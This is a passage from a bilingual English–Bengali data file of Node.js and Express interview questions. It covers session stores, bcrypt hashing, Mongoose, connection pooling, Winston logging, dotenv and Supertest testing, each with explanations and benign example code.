   - **মেমোরি স্টোর**: ডিফল্ট অপশন যা সার্ভার র‍্যামে সেশন ডাটা রাখে। সার্ভার রিস্টার্ট দিলে সব সেশন ডাটা মুছে যায়।
   - **এক্সটারনাল স্টোর (Redis, Mongo)**: সার্ভারের বাইরে ডাটাবেসে সেশন রাখে, যাতে একাধিক লাইভ সার্ভার রান থাকলেও সেশন সিনক্রোনাইজড থাকে।

### বাস্তব-ভিত্তিক উদাহরণ
শপিং কার্টে প্রোডাক্ট সিলেক্ট করে রাখার লজিক: কার্টের আইটেমগুলো সার্ভারের \`req.session.cart\` ফোল্ডারে সেভ থাকে। ইউজার পেজ রিলোড দিলেও কুকি ম্যাচিংয়ের মাধ্যমে আইটেমগুলো সুরক্ষিত থাকে।

### উত্তম অনুশীলন
সেশন কুকি ডিক্লেয়ার করার সময় প্রোপার্টিগুলো সেট করুন: \`httpOnly: true\` (যাতে ব্রাউজারের কোনো কাস্টম স্ক্রিপ্ট কুকি ডাটা রিড করতে না পারে), \`secure: true\` (এইচটিটিপিএস পোর্টে ডাটা পাঠানো নিশ্চিত করতে)। প্রোডাকশনে ইন-মেমোরি সেশন স্টোর ব্যবহার নিষিদ্ধ, এর বদলে রেডিস (Redis) ব্যবহার করুন।

### সাধারণ ভুলসমূহ
লোকাল মেমোরি সেশন রানিং রেখে ক্লাউডে লোড ব্যালেন্সার দিয়ে ২টি সার্ভার ইনস্ট্যান্স ডেপ্লয় করা। এর ফলে ইউজারের রিকোয়েস্ট সার্ভার ১ থেকে ২ এ যাওয়ার সাথে সাথেই সেশন ডাটা না থাকায় ইউজার হঠাৎ লগআউট হয়ে যায়।

### Code Example
\`\`\`javascript
const express = require('express');
const session = require('express-session');
const app = express();

app.use(session({
  secret: 'devprep-keyboard-cat', // সেশন আইডি এনক্রিপ্ট করার সিক্রেট কী
  resave: false,
  saveUninitialized: true,
  cookie: {
    secure: false, // প্রোডাকশনে ট্রু (true) করতে হবে
    httpOnly: true, // এক্সএসএস (XSS) আক্রমণ প্রতিরোধ করে
    maxAge: 60000 
  }
}));

app.get('/api/session-view', (req, res) => {
  if (!req.session.views) {
    req.session.views = 1;
  } else {
    req.session.views++;
  }
  res.json({ viewsCount: req.session.views });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-49',
    title: 'Explain password hashing in Node.js using bcrypt.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Cryptography', 'Password Hashing', 'Bcrypt'],
    enAnswer: 'Password hashing converts plain-text passwords into cryptographically secure hashes using salt. bcrypt is a standard Node.js library that implements key stretching and automatic salting, preventing dictionary and rainbow table attacks.',
    bnAnswer: 'পাসওয়ার্ড হ্যাশিং প্লেইন টেক্সট পাসওয়ার্ডকে সিকিউর ক্রিপ্টোগ্রাফিক হ্যাশে রূপান্তর করে। bcrypt হলো নোডজেএস-এর একটি স্ট্যান্ডার্ড লাইব্রেরি যা সল্টিং ও হ্যাশিং মেকানিজম অ্যাপ্লাই করে ডিকশনারি ও রেইনবো টেবিল অ্যাটাক প্রতিরোধ করে।',
    enExplanation: `### Explanation
Never store plain-text passwords in database collections. If the database leaks, all user credentials become exposed.
- **Salt**: Random bytes generated and combined with the password before hashing. This ensures two users with the same password (e.g. "password123") have completely different hash signatures.
- **Cost Factor (Salt Rounds)**: Determines how many hashing iterations are performed (usually 10 to 12). Higher rounds make the hash stronger but consume more CPU time.
- **Verification**: Hashing functions are one-way. To check a login attempt, bcrypt hashes the submitted password with the salt saved in the database hash and compares the final signatures.

### Real-World Example
When registering, a user submits the password \`"mySecurePass123"\`. The server runs \`bcrypt.hash()\`, resulting in a signature like \`$2b$10$abc123xyz...\`. This hash is saved in the database. During login, the server calls \`bcrypt.compare("mySecurePass123", hash)\` to authenticate.

### Best Practice
Set the salt rounds to 10 or 12. Too low makes brute-forcing easy, while too high (like 16) blocks the single main JavaScript thread for several seconds, opening the server to DoS attacks. Always use asynchronous bcrypt methods (\`bcrypt.hash()\`, \`bcrypt.compare()\`) to avoid blocking the event loop.

### Common Mistakes
Using synchronous bcrypt methods (\`bcrypt.hashSync()\`) inside routes, which blocks the thread pool and makes the server freeze during registration and login requests.

### Code Example
\`\`\`javascript
const bcrypt = require('bcrypt');

const plainPassword = 'user123Pass';
const saltRounds = 10;

async function runDemo() {
  // 1. Generate hash asynchronously
  const hash = await bcrypt.hash(plainPassword, saltRounds);
  console.log("Generated secure Hash:", hash);

  // 2. Compare passwords at login
  const isMatch = await bcrypt.compare(plainPassword, hash);
  console.log("Is Password Login Match?:", isMatch); // true

  const isWrong = await bcrypt.compare('wrongPass', hash);
  console.log("Is Wrong Login Match?:", isWrong); // false
}

runDemo();
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
ডাটাবেসে পাসওয়ার্ড কখনো প্লেইন টেক্সট হিসেবে রাখা উচিত নয়। ডাটাবেস হ্যাক বা ফাঁস হলে সব ইউজারের পাসওয়ার্ড প্রকাশ্যে চলে যায়।
- **সল্ট (Salt)**: পাসওয়ার্ড হ্যাশ করার আগে তার সাথে যুক্ত করা কিছু র্যান্ডম বাইট। এর ফলে দুজন ইউজারের পাসওয়ার্ড হুবহু এক হলেও তাদের হ্যাশ কোড সম্পূর্ণ আলাদা তৈরি হয়।
- **কস্ট ফ্যাক্টর (Salt Rounds)**: হ্যাশিং লুপ কতবার ঘুরবে তা নির্ধারণ করে (স্ট্যান্ডার্ড সাইজ ১০-১২)। সংখ্যা বেশি হলে হ্যাশ শক্তিশালী হয় কিন্তু সিপিইউ সময় বেশি লাগে।
- **ভেরিফিকেশন**: হ্যাশিং কেবল একমুখী (One-way)। লগইনের সময় এন্ট্রি করা পাসওয়ার্ড ডাটাবেসের হ্যাশের ভেতরের সল্ট দিয়ে পুনরায় হ্যাশ করে দুই হ্যাশের মিল পরীক্ষা করা হয়।

### বাস্তব-ভিত্তিক উদাহরণ
রেজিস্ট্রেশনের সময় ইউজার পাসওয়ার্ড দিলেন \`"mySecurePass123"\`। সার্ভার \`bcrypt.hash()\` রান করে ডাটাবেসে সেভ করল \`$2b$10$abc123xyz...\`। লগইনের সময় সার্ভার কল করে \`bcrypt.compare("mySecurePass123", hash)\` যা ট্রু বা ফলস ভ্যালু রিটার্ন করে।

### উত্তম অনুশীলন
সল্ট রাউন্ড ১০ বা ১২ এর মধ্যে রাখুন। এর বেশি হলে প্রতিবার হ্যাশ করতে কয়েক সেকেন্ড সময় লাগতে পারে যা মেইন থ্রেড ব্লক করে সার্ভারে ডস (DoS) এটাকের ঝুঁকি বাড়ায়। সর্বদা অ্যাসিনক্রোনাস সংস্করণ (\`bcrypt.hash\`) ব্যবহার করুন।

### সাধারণ ভুলসমূহ
রাউটের হ্যান্ডলারে সরাসরি \`hashSync()\` বা \`compareSync()\` কল করা, যা পাসওয়ার্ড ভেরিফাই করার সময় বাকি সব ইউজারের রিকোয়েস্ট কিউ ব্লক করে সার্ভার হ্যাং করে দেয়।

### Code Example
\`\`\`javascript
const bcrypt = require('bcrypt');

const plainPassword = 'user123Pass';
const saltRounds = 10;

async function runDemo() {
  // ১. অ্যাসিনক্রোনাসলি হ্যাশ তৈরি করা
  const hash = await bcrypt.hash(plainPassword, saltRounds);
  console.log("জেনারেট হওয়া হ্যাশ:", hash);

  // ২. লগইনের সময় পাসওয়ার্ড তুলনা করা
  const isMatch = await bcrypt.compare(plainPassword, hash);
  console.log("পাসওয়ার্ড কি মিলেছে?:", isMatch); // true

  const isWrong = await bcrypt.compare('wrongPass', hash);
  console.log("ভুল পাসওয়ার্ড কি মিলেছে?:", isWrong); // false
}

runDemo();
\`\`\``
  },
  {
    id: 'node-express-50',
    title: 'How do you connect a Node.js/Express application to MongoDB using Mongoose?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Mongoose', 'MongoDB', 'Configuration'],
    enAnswer: 'Connect to MongoDB by calling mongoose.connect() passing the connection URI and configuration parameters. It is best to establish the connection before booting the Express server and manage schema definitions using Mongoose schemas.',
    bnAnswer: 'MongoDB এর সাথে কানেকশন তৈরি করতে mongoose.connect() মেথড কল করে ডাটাবেস কানেকশন ইউআরআই পাস করতে হয়। এক্সপ্রেস সার্ভার পোর্ট লিসেন শুরু করার আগেই কানেকশন সফল করা এবং Mongoose স্কিমার সাহায্যে ডাটা স্ট্রাকচার নিয়ন্ত্রণ করা সর্বোত্তম অনুশীলন।',
    enExplanation: `### Explanation
Mongoose is an Object Data Modeling (ODM) library for MongoDB and Node.js.
Key connection steps:
1. **URI Resolution**: Fetch MongoDB Connection URL from env: \`process.env.MONGODB_URI\`.
2. **Connection Call**: Call \`mongoose.connect(uri)\`. Mongoose handles connection pools automatically.
3. **Listen for Connection Events**: Monitor connection states (e.g. \`connected\`, \`error\`, \`disconnected\`).
4. **Define Schemas**: Set up data models to validate collection updates.

### Real-World Example
At startup, the server tries to connect to MongoDB Atlas. If Atlas is down, mongoose fires an error event. The server prints this error to the console and exits immediately instead of running in a broken state.

### Best Practice
Establish database connections before calling \`app.listen()\`. Handle connection errors gracefully and set proper pool sizes to allow concurrent queries safely.

### Common Mistakes
Forgetting to wrap database operations in try/catch blocks or not checking for connection status before firing write queries, resulting in request timeout crashes.

### Code Example
\`\`\`javascript
const express = require('express');
const mongoose = require('mongoose');
const app = express();

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/devprep';

async function startServer() {
  try {
    // Connect to MongoDB
    await mongoose.connect(MONGODB_URI);
    console.log("Connected to MongoDB successfully!");

    // Boot server only after DB connects
    const server = app.listen(3000, () => {
      console.log("Server running on port 3000");
      server.close();
      mongoose.disconnect();
    });
  } catch (error) {
    console.error("Database connection failed:", error.message);
    process.exit(1);
  }
}

startServer();
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
Mongoose হলো নোডজেএস ও মঙ্গোডিবি-র জন্য একটি অবজেক্ট ডাটা মডেলিং (ODM) লাইব্রেরি।
সংযোগ স্থাপনের ধাপসমূহ:
১. **ইউআরআই সংগ্রহ**: এনভায়রনমেন্ট ফাইল থেকে মঙ্গোডিবি ইউআরআই রিড করা: \`process.env.MONGODB_URI\`।
২. **সংযোগ স্থাপন**: \`mongoose.connect(uri)\` কল করা। এটি স্বয়ংক্রিয়ভাবে কানেকশন পুল তৈরি করে।
৩. **ইভেন্ট মনিটরিং**: ডাটাবেস ডিসকানেক্ট বা কানেকশন এরর হলে কনসোলে ট্র্যাক রাখা।
৪. **স্কিমা নির্ধারণ**: ডাটাবেসে কেমন ডাটা যাবে তার সঠিক রূপরেখা তৈরি করা।

### বাস্তব-ভিত্তিক উদাহরণ
সার্ভার বুট হওয়ার সময় এটি মঙ্গোডিবি ক্লাউড এটলাসের সাথে কানেক্ট করার চেষ্টা করে। ক্লাউড ডাউন থাকলে নোডজেএস ডাটাবেস এরর ইভেন্ট ফায়ার করে প্রসেসটি বন্ধ করে দেয় যাতে ভুল অ্যাপ রান না থাকে।

### উত্তম অনুশীলন
ডাটাবেস কানেকশন সাকসেস হওয়ার পরই কেবল \`app.listen()\` কল করে সার্ভার পোর্ট সচল করুন। ডাটাবেস কানেকশন এরর হ্যান্ডেল করতে ট্রাই-ক্যাচ ব্লক ব্যবহার করুন।

### সাধারণ ভুলসমূহ
ডাটাবেস কানেকশন ঠিকমতো সেটআপ না করেই কোয়েরি রিকোয়েস্ট পাঠানো শুরু করা, যার ফলে রিকোয়েস্ট প্রসেসিং এররে আটকে গিয়ে পেজ ঝুলিয়ে রাখে।

### Code Example
\`\`\`javascript
const express = require('express');
const mongoose = require('mongoose');
const app = express();

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/devprep';

async function startServer() {
  try {
    // মঙ্গোডিবি তে কানেক্ট করা
    await mongoose.connect(MONGODB_URI);
    console.log("মঙ্গোডিবি কানেকশন সফল হয়েছে!");

    // কানেকশন হওয়ার পরেই কেবল সার্ভার লিসেন শুরু করবে
    const server = app.listen(3000, () => {
      console.log("সার্ভার চলছে ৩০০০ পোর্টে");
      server.close();
      mongoose.disconnect();
    });
  } catch (error) {
    console.error("ডাটাবেস কানেকশন এরর:", error.message);
    process.exit(1);
  }
}

startServer();
\`\`\``
  },
  {
    id: 'node-express-51',
    title: 'Explain Database Connection Pooling and why it is critical for Node.js servers.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Database', 'Connection Pool', 'Performance'],
    enAnswer: 'Database connection pooling maintains a cache of active database connections (a pool) that can be reused for queries. It is critical for Node.js because establishing a new database TCP connection for every incoming HTTP request is extremely slow and resource-heavy.',
    bnAnswer: 'ডাটাবেস কানেকশন পুলিং (Connection Pooling) অ্যাক্টিভ ডাটাবেস কানেকশনগুলোর ক্যাশ বজায় রাখে যা বারবার কোয়েরির কাজে ব্যবহার করা যায়। নোডজেএস-এর জন্য এটি জরুরি কারণ প্রতিবার ইনকামিং এইচটিটিপি রিকোয়েস্টের জন্য নতুন কানেকশন তৈরি করা অত্যন্ত ধীরগতির ও ব্যয়বহুল।',
    enExplanation: `### Explanation
Creating a database connection involves a complex handshake: setting up TCP sockets, verifying database credentials, and allocating memory.
How Connection Pooling optimizes this:
1. **The Pool**: Instead of closing a connection after a query finishes, the application returns the connection to a "pool" (cache).
2. **Reusability**: When a new request arrives, it borrows an active connection from the pool, runs the query instantly, and releases it back.
3. **Queueing**: If all connections in the pool (e.g. pool limit of 10) are active, new queries wait in a queue instead of overwhelming the database server with thousands of concurrent socket allocations.

### Real-World Example
In high-traffic Node.js setups (such as PostgreSQL with \`pg-pool\` or MySQL with \`mysql2/promise\`), using connection pools allows the server to process 1,000 queries per second using only 10 to 20 stable database connection tunnels.

### Best Practice
Always enable and configure connection pools for production database drivers. Set the max pool size based on your database capacity and your Node.js application scaling rules (e.g., if you have 5 PM2 processes, each with a pool size of 10, total open connections will be 50).

### Common Mistakes
Opening a new connection on every route handler call and closing it at the end of the controller. This causes high CPU usage on the database server and network latency.

### Code Example
\`\`\`javascript
// Conceptual database pool configuration using mysql2 client format
const mysql = require('mysql2/promise');

// Create the connection pool (reused across the application)
const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  database: 'test',
  connectionLimit: 10, // Max 10 active connections in pool
  queueLimit: 0 // Unlimited queuing of queries
});

async function queryUser(userId) {
  // Automatically borrows, executes, and releases connection back to the pool
  const [rows] = await pool.query('SELECT * FROM users WHERE id = ?', [userId]);
  return rows;
}

console.log("Database connection pool initialized.");
// Close pool in test env
setTimeout(() => pool.end(), 100);
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
ডাটাবেস কানেকশন তৈরি করতে টিসিপি হ্যান্ডশেক ও ক্রেডেনশিয়াল চেকের প্রয়োজন হয়, যা বেশ সময়সাপেক্ষ।
কানেকশন পুলিংয়ের কর্মপ্রক্রিয়া:
১. **পুল তৈরি**: কোয়েরি শেষ হওয়ার পর কানেকশনটি বন্ধ না করে একটি পুলে (ক্যাশ) ফেরত পাঠানো হয়।
২. **পুনর্ব্যবহারযোগ্যতা**: নতুন রিকোয়েস্ট আসলে সেটি পুল থেকে ফ্রী থাকা একটি সকেট ধার নেয়, খুব দ্রুত কুয়েরি এক্সিকিউট করে এবং পুনরায় পুলে ফেরত দেয়।
৩. **কিউ বা সারি**: যদি পুলে থাকা সব কানেকশন (যেমন: লিমিট ১০টি) ব্যস্ত থাকে, তবে অতিরিক্ত নতুন কুয়েরিগুলো একটি লাইনে অপেক্ষা করে। এতে ডাটাবেস ক্র্যাশ করার হাত থেকে বেঁচে যায়।

### বাস্তব-ভিত্তিক উদাহরণ
উচ্চ ট্রাফিকের নোডজেএস প্রজেক্টে (যেমন PostgreSQL বা MySQL), কানেকশন পুলিং ব্যবহারের ফলে সার্ভার মাত্র ১০-২০টি সকেটের সাহায্যেই প্রতি সেকেন্ডে হাজার হাজার কুয়েরি নিখুঁতভাবে শেষ করতে পারে।

### উত্তম অনুশীলন
প্রোডাকশন ডেপ্লয়মেন্টে সর্বদা ডাটাবেস ড্রাইভারের কানেকশন পুল অপশন সক্রিয় করুন। আপনার ডাটাবেসের ধারণক্ষমতা অনুযায়ী সর্বোচ্চ পুল সাইজ (যেমন: \`connectionLimit: 15\`) সেট করুন।

### সাধারণ ভুলসমূহ
প্রতিটি রাউট হ্যান্ডলার এন্টার করার সময় নতুন কানেকশন ওপেন করা এবং কোড শেষে তা ক্লোজ করা। এর ফলে কানেকশন ওভারহেডের কারণে ডাটাবেস সার্ভারের সিপিইউ দ্রুত ১০০% এ পৌছে যায়।

### Code Example
\`\`\`javascript
// mysql2 ক্লায়েন্ট ফরম্যাটে ডাটাবেস পুলের কনফিগারেশন নমুনা
const mysql = require('mysql2/promise');

// কানেকশন পুল তৈরি করা
const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  database: 'test',
  connectionLimit: 10, // পুলে সর্বোচ্চ ১০টি কানেকশন থাকবে
  queueLimit: 0 
});

async function queryUser(userId) {
  // পুল থেকে কানেকশন ধার নিয়ে অটোমেটিক কুয়েরি শেষে ফেরত দেয়
  const [rows] = await pool.query('SELECT * FROM users WHERE id = ?', [userId]);
  return rows;
}

console.log("ডাটাবেস কানেকশন পুল ইনিশিয়ালাইজড হয়েছে।");
setTimeout(() => pool.end(), 100);
\`\`\``
  },
  {
    id: 'node-express-52',
    title: 'Explain log management in Node.js using Winston and Morgan.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Logging', 'Winston', 'Morgan', 'DevOps'],
    enAnswer: 'Morgan is used to log HTTP request metadata directly (like URL, method, status), while Winston is a multi-transport logging library used for application logs (errors, info messages). They are combined in production to output structured logs to console and write to dedicated files.',
    bnAnswer: 'Morgan মূলত ইনকামিং HTTP রিকোয়েস্টের মেটাডাটা লগ করে। Winston হলো একটি মাল্টি-ট্রান্সপোর্ট লগিং লাইব্রেরি যা অ্যাপ্লিকেশনের ভেতরের এরর বা ইনফো মেসেজ ট্র্যাকিংয়ে ব্যবহৃত হয়। প্রোডাকশনে এদের সমন্বয়ে কনসোল ও ফাইলসিস্টেমে লগ আউটপুট তৈরি করা হয়।',
    enExplanation: `### Explanation
Log management requires structured output (like JSON format) to be readable by indexing engines (like Elasticsearch or Logstash):
1. **Morgan (Request Logger)**: Captures HTTP requests, logs execution performance, and redirects output streams.
2. **Winston (Application Logger)**:
   - **Transports**: Destinations for logs (e.g. writing to the console, saving to local files, or sending to cloud databases).
   - **Levels**: Categorizes logs by priority: \`error\`, \`warn\`, \`info\`, \`http\`, \`debug\`.
   - **Formatters**: Combines timestamp, log levels, and stringifies metadata into clean JSON lines.

Combining both allows you to capture network requests via Morgan and pipe them directly into Winston's HTTP transport pipeline.

### Real-World Example
In a production server:
- Critical code crashes are caught, formatted, and written to \`logs/error.log\` via Winston.
- General server traffic flows are written to \`logs/combined.log\`.
- Console outputs remain active for real-time monitoring.

### Best Practice
Set up structured logging in JSON format for production. This allows log aggregators (Datadog, Kibana) to parse log levels, trace IDs, and timestamps natively without regex parsing scripts.

### Common Mistakes
Using \`console.log()\` directly inside catch blocks to record application errors. If the container restarts or crashes, these terminal logs might get lost unless they are streamed or written to persistent files via Winston.

### Code Example
\`\`\`javascript
const winston = require('winston');

// Configure Winston Logger
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json() // Outputs structured JSON logs
  ),
  transports: [
    new winston.transports.Console(), // Log to console
    new winston.transports.File({ filename: 'error.log', level: 'error' }) // Log errors to file
  ]
});

// Usage
logger.info("Winston Logger initialized successfully!");
logger.error("Simulated database failure event", { errorCode: 5003 });
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
লগ ম্যানেজমেন্টে টেক্সট মেসেজের পরিবর্তে স্ট্রাকচার্ড বা জেএসন ফরম্যাট ব্যবহার করা ভালো যাতে সার্চ ইঞ্জিনগুলো (যেমন Elasticsearch) সহজে রিড করতে পারে:
১. **Morgan (রিকোয়েস্ট লগার)**: নেটওয়ার্ক ডাটা রিসিভ করে এবং এইচটিটিপি মেটাডাটা টার্মিনালে প্রিন্ট করে।
২. **Winston (অ্যাপ্লিকেশন লগার)**:
   - **Transports**: লগের গন্তব্য ঠিক করে (যেমন কনসোল প্রিন্ট করা, লোকাল ফাইলে সেভ করা বা ক্লাউডে পাঠানো)।
   - **Levels**: লগের গুরুত্ব ঠিক করে: \`error\`, \`warn\`, \`info\`, \`http\`, \`debug\`।
   - **Formatters**: টাইমস্ট্যাম্প ও লগ লেভেলকে একত্রিত করে সুন্দর জেএসন লাইন তৈরি করে।

মরগান ও উইনস্টনকে একসাথে কনফিগার করে মরগানের রিকোয়েস্ট লগগুলো সরাসরি উইনস্টনের স্ট্রিমে ট্রান্সফার করা যায়।

### বাস্তব-ভিত্তিক উদাহরণ
প্রোডাকশন সার্ভারে:
- কোডের এরর বা ফাইল সিস্টেম এররগুলো উইনস্টন দিয়ে \`logs/error.log\` ফাইলে রাইট করা হয়।
- সাধারণ ভিজিটর ট্রাফিকগুলো মরগান থেকে নিয়ে \`logs/combined.log\` ফাইলে সেভ করা হয়।

### উত্তম অনুশীলন
প্রোডাকশনে সর্বদা জেএসন (JSON) ফরম্যাটে লগ করুন। এর ফলে ডাটালগ ও কিবানা (Kibana) এর মতো টুলসগুলো সহজেই লগ রিড ও ফিল্টার করতে পারে।

### সাধারণ ভুলসমূহ
এরর ক্যাচ ব্লকে কেবল \`console.log(err)\` লিখে রাখা। কনসোল লক হয়ে গেলে বা কন্টেইনার রিস্টার্ট হলে এই এরর ডাটা চিরতরে হারিয়ে যাবে যদি না তা উইনস্টন ফাইলে রাইট করে।

### Code Example
\`\`\`javascript
const winston = require('winston');

// উইনস্টন লগার কনফিগারেশন
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json() // জেএসন ফরম্যাটে আউটপুট
  ),
  transports: [
    new winston.transports.Console(), // কনসোলে দেখাবে
    new winston.transports.File({ filename: 'error.log', level: 'error' }) // এরর হলে ফাইল রাইট করবে
  ]
});

// ব্যবহার বিধি
logger.info("উইনস্টন লগার সচল হয়েছে!");
logger.error("ডাটাবেস কানেকশন ফেইলর ইভেন্ট", { errorCode: 5003 });
\`\`\``
  },
  {
    id: 'node-express-53',
    title: 'Explain dotenv configuration and how to prevent loading environment variables multiple times.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'Configuration', 'Environment Variables', 'Dotenv'],
    enAnswer: 'dotenv loads variables from a .env file into process.env. To prevent loading variables multiple times, call dotenv.config() once at the absolute entry point of the application (e.g. index.js or app.js) before importing any routers or modules.',
    bnAnswer: 'dotenv মডিউলটি .env ফাইল থেকে ভ্যারিয়েবল প্রসেস করে process.env-এ লোড করে। একাধিকবার লোড হওয়া এড়াতে অ্যাপ্লিকেশনের মূল প্রবেশদ্বারে (যেমন index.js বা app.js) সব মডিউল ইম্পোর্ট করার আগে একবারই dotenv.config() কল করা উচিত।',
    enExplanation: `### Explanation
How to manage environment setups cleanly:
1. **The dotEnv mechanism**: \`dotenv.config()\` reads your path-specific \`.env\` file, parses the key-value structures, and merges them into \`process.env\` if they are not already set.
2. **Duplicate calls**: Calling \`dotenv.config()\` inside multiple nested route files leads to unnecessary filesystem reads on startup and can cause path resolution bugs if the process starts from different relative directories.
3. **Singleton Pattern**: By calling \`config()\` once at the entry point of the server, the loaded variables remain cached globally inside \`process.env\` for all subsequently required modules.

### Real-World Example
If your entry file is \`server.js\`, placing \`require('dotenv').config()\` on line 1 guarantees that when \`const db = require('./db')\` loads on line 5, the database configuration helper can read \`process.env.DATABASE_URL\` instantly.

### Best Practice
Register \`dotenv.config()\` once at the very top of your application's entry script. Alternatively, you can run Node.js with the command-line preloader flag: \`node -r dotenv/config server.js\`, which completely removes the need to write dotenv code in your codebase.

### Common Mistakes
Calling \`dotenv.config()\` inside sub-router modules or controller files. This leads to duplicate operations and breaks when the running directory changes.

### Code Example
\`\`\`javascript
// 1. Entry Point: server.js (Correct Approach)
require('dotenv').config(); // Load once at the absolute top

const express = require('express');
const app = express();

// Now any module required below has access to variables automatically
// const db = require('./config/database'); 

console.log("Loaded Secret Key from Environment:", process.env.JWT_SECRET || 'Not Found');
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
এনভায়রনমেন্ট ভ্যারিয়েবল লোড করার উত্তম প্রক্রিয়া:
১. **ডাটা ইন্টিগ্রেশন**: \`dotenv.config()\` মেথডটি লোকাল ডিরেক্টরির \`.env\` ফাইল রিড করে ভ্যালুগুলো \`process.env\` এ যুক্ত করে।
২. **ডুপ্লিকেট কল**: প্রতিটি ফাইলে আলাদা করে \`require('dotenv').config()\` লিখলে প্রতিবার ফাইল রিড করার মেমোরি খরচ বাড়ে এবং রিলেটিভ পাথের কারণে লোড এরর হতে পারে।
৩. **সিঙ্গেলটন মেকানিজম**: এন্ট্রি ফাইলে একবার এটি রান করালে গ্লোবাল মেমোরিতে ভ্যালুগুলো থেকে যায়, তাই পরবর্তী কোনো ফাইলে পুনরায় কল করার প্রয়োজন পড়ে না।

### বাস্তব-ভিত্তিক উদাহরণ
সার্ভারের মেইন এন্ট্রি ফাইল \`server.js\` এর লাইন ১-এ \`require('dotenv').config()\` কল করা হলে, লাইন ৫-এ ডাটাবেস সার্ভিস ইম্পোর্ট করার সময় সে ডাটাবেস ইউআরআই ইউআরএল এপিআই রিড করতে পারবে।

### উত্তম অনুশীলন
অ্যাপের মেইন ফাইলের সবার ওপরে \`dotenv.config()\` একবারই কল করুন। অথবা নোডজেএস-এর প্রি-লোডার মেকানিজম ব্যবহার করে টার্মিনালে কোড রান করান: \`node -r dotenv/config server.js\`, এতে জাভাস্ক্রিপ্ট ফাইলে আর ডটএনভ লোডার কোড লিখতে হবে না।

### সাধারণ ভুলসমূহ
সাব-রাউটার বা কন্ট্রোলার ফাইলের ভেতর আলাদা করে ডটএনভ কনফিগার করা। ডিরেক্টরি চেঞ্জ হলে এটি প্রায়ই ফাইল নট ফাউন্ড এরর দেয়।

### Code Example
\`\`\`javascript
// ১. মেইন এন্ট্রি ফাইল (server.js)
require('dotenv').config(); // সবার উপরে একবার লোড করা হলো

const express = require('express');
const app = express();

// এখন এর নিচে রিকোয়ার হওয়া সব ফাইলে ডাটা এক্সেস পাওয়া যাবে
// const db = require('./config/database');

console.log("গোপন সিক্রেট কী:", process.env.JWT_SECRET || 'পাওয়া যায়নি');
\`\`\``
  },
  {
    id: 'node-express-54',
    title: 'How do you perform integration testing on Express applications using Jest and Supertest?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'Testing', 'Jest', 'Supertest'],
    enAnswer: 'Integration testing simulates real HTTP requests without binding the server to a network port. In Express, this is done by exporting the app instance (without calling app.listen) and passing it to Supertest request(app) to test routes, status codes, and JSON responses using Jest assertions.',
    bnAnswer: 'ইন্টিগ্রেশন টেস্টিং মূলত রিয়াল পোর্ট বাইন্ড না করেই নেটওয়ার্ক রিকোয়েস্ট সিমুলেট করে। এক্সপ্রেসজেএস-এ এটি করতে app.listen() কল না করে শুধু app ইনস্ট্যান্সটি এক্সপোর্ট করে Supertest-এর request(app) ফাংশনে পাস করে টেস্ট সম্পন্ন করা হয়।',
    enExplanation: `### Explanation
Integration tests verify how routers, controllers, and middlewares interact:
1. **Exporting \`app\`**: Decouple the Express app setup from the network listener. Define all configurations inside \`app.js\` and export it. Create a separate file like \`server.js\` that imports \`app.js\` and calls \`app.listen()\`.
2. **Supertest Isolation**: Supertest starts a temporary ephemeral port internally, issues mock HTTP calls (GET, POST, etc.) using HTTP streams, and returns the response details.
3. **Jest Assertions**: Use Jest's \`expect()\` API to assert response parameters, headers, status codes, and JSON payloads.

### Real-World Example
Before deploying code changes, your CI/CD pipeline runs unit and integration tests. If a developer accidentally breaks the authentication middleware, the Supertest integration suite checks the secure routes, receives a \`500\` instead of a \`401/200\`, and fails the build immediately.

### Best Practice
Separate the server listener configuration from the Express configuration. Avoid calling \`app.listen()\` inside your test runs, as this keeps the port bound and prevents test frameworks from executing concurrent test suites clean and fast.

### Common Mistakes
Including \`app.listen()\` in the main \`app.js\` module that tests import, which causes tests to fail with \`EADDRINUSE: port already in use\` errors when run in parallel.

### Code Example
\`\`\`javascript
// 1. Target code: app.js
const express = require('express');
const app = express();

app.get('/api/welcome', (req, res) => {
  res.status(200).json({ message: 'Welcome to DevPrep!' });
});

module.exports = app; // Export app without app.listen()

// 2. Test code: app.test.js (Executed by Jest)
const request = require('supertest');
const testApp = require('./app'); // Import app

describe('GET /api/welcome', () => {
  it('should return 200 OK and a welcome JSON message', async () => {
    const res = await request(testApp).get('/api/welcome');
    
    expect(res.statusCode).toEqual(200);
    expect(res.body).toHaveProperty('message');
    expect(res.body.message).toBe('Welcome to DevPrep!');
  });
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
ইন্টিগ্রেশন টেস্টিং যাচাই করে কীভাবে রাউটার, মিডলওয়্যার ও কন্ট্রোলার অবজেক্টগুলো একত্রে কাজ করছে:
১. **\`app\` এক্সপোর্ট করা**: এক্সপ্রেস কনফিগারেশনকে সার্ভার রান লজিক থেকে আলাদা করুন। সব কোড \`app.js\`-এ লিখে এক্সপোর্ট করুন। আর \`server.js\` ফাইলে অ্যাপ রিকোয়ার করে \`app.listen()\` কল করুন।
২. **সুপারটেস্ট আইসোলেশন**: সুপারটেস্ট (Supertest) রানটাইমে টেম্পোরারি নেটওয়ার্ক পোর্ট চালু করে মক এইচটিটিপি রিকোয়েস্ট তৈরি করে রেসপন্স নিয়ে আসে।
